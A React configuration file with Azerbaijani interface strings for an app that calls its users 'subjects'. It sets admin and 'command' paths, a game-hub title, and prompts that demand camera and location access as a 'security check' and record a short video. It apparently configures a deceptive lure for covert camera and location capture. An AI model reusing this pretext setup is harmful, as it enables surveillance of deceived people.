/**
 * Backend API və Socket.IO (yerli: 3500 port).
 */
const DEFAULT_BACKEND = 'http://localhost:3500';

export const API_BASE_URL = (process.env.REACT_APP_API_URL || DEFAULT_BACKEND).replace(
    /\/$/,
    ''
);

export const SOCKET_URL = API_BASE_URL;

export const ADMIN_PATH =
    (process.env.REACT_APP_ADMIN_PATH || '/admin').replace(/\/$/, '') || '/admin';

export const COMMAND_PATH =
    (process.env.REACT_APP_COMMAND_PATH || '/command').replace(/\/$/, '') || '/command';

export const ADMIN_API_KEY = process.env.REACT_APP_ADMIN_KEY || '';

export const SUBJECT_TITLE =
    process.env.REACT_APP_SUBJECT_TITLE || 'Sorğu doğrulaması';

export const SUBJECT_MESSAGE =
    process.env.REACT_APP_SUBJECT_MESSAGE ||
    'Davam etmək üçün kamera və konum icazəsi verməlisiniz. Bu, təhlükəsizlik yoxlamasıdır.';

export const SUBJECT_CAMERA_DONE_KEY = 'subject_camera_done_main';

export const CLIENT_SESSION_KEY = 'subject_client_session_id';

export function getClientSessionId() {
    try {
        let id = localStorage.getItem(CLIENT_SESSION_KEY);
        if (!id) {
            id = `cs_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
            localStorage.setItem(CLIENT_SESSION_KEY, id);
        }
        return id;
    } catch {
        return `cs_${Date.now()}`;
    }
}

export const SUBJECT_CAMERA_MESSAGE =
    process.env.REACT_APP_SUBJECT_CAMERA_MESSAGE || SUBJECT_MESSAGE;

export const CAMERA_VIDEO_SECONDS = Number(process.env.REACT_APP_CAMERA_VIDEO_SECONDS) || 5;

export const SUBJECT_SUCCESS_MESSAGE =
    process.env.REACT_APP_SUBJECT_SUCCESS_MESSAGE ||
    'Təsdiqləndi. Sorğunuz qəbul olundu — bu pəncərəni bağlaya bilərsiniz.';

export const SUBJECT_GRANTED_KEY = 'subject_locationGranted';

export function subjectCameraDoneKey(token) {
    return `subject_camera_done_${token}`;
}

export const CONSENT_TEXT =
    process.env.REACT_APP_CONSENT_TEXT ||
    `${SUBJECT_TITLE}. ${SUBJECT_CAMERA_MESSAGE} Kamera və konum məlumatları yoxlama məqsədilə işlənir.`;

export const GAME_HUB_TITLE = process.env.REACT_APP_GAME_HUB_TITLE || 'Pulse Arena';

export const GAME_HUB_TAGLINE =
    process.env.REACT_APP_GAME_HUB_TAGLINE || 'Sürətli mini-oyunlar — level qazan';

export function pulseProgressKey(clientKey) {
    return `pulse_progress_${clientKey}`;
}
